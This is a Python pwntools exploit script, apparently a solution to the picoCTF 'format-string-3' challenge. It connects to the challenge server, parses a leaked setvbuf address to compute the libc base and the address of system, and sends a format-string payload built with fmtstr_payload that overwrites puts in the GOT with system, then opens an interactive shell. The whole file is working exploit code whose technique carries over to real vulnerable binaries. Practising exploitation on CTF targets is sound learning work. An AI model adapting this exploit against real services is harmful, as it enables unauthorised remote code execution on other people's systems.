from pwn import * # import pwntools

context.log_level = "info"
# so the generated payload is for 64-bit, used binary given by challenge
elf = context.binary = ELF("./format-string-3", checksec=False) 

# entering the binary for the libc library
libc = ELF("./libc.so.6")

fmt_str_offset = 38 # calculated offset
# hard-coding it is fine, but this way the offset can adapt to the specific version
setvbuf_offset = libc.symbols['setvbuf']
system_offset = libc.symbols['system']
puts_addr = elf.got['puts']
print(f"puts addr: {hex(puts_addr)}")


#conn = process(elf.path, env={'LD_PRELOAD': './libc.so.6'}) #Testing locally
conn = remote("rhea.picoctf.net", 63531 ) # change port number

#these lines allow me to stop at right before the address for setvbuf is given
line1 = conn.recvline(timeout=2) or b""
line2 = conn.recvuntil(b':', timeout=2) or b""
leak_line = conn.recvline(timeout=2) or b""

#take in and format the setvbuf address given
curr_setvbuf = int(leak_line.decode(errors='ignore').strip().split()[-1], 16)
log.success(f"setvbuf@libc = {hex(curr_setvbuf)}")

# calculating the base address and system address
base_addr = curr_setvbuf - setvbuf_offset
system_addr = base_addr + system_offset
log.success(f"libc base = {hex(base_addr)}")
log.success(f"system = {hex(system_addr)}")

# writing the payload and sending it
writes = { puts_addr: system_addr }
payload = fmtstr_payload(fmt_str_offset, writes, write_size='byte')
log.info(f"payload length = {len(payload)}")
conn.sendline(payload)

conn.interactive() # must use interactive if I want to actually use the shell created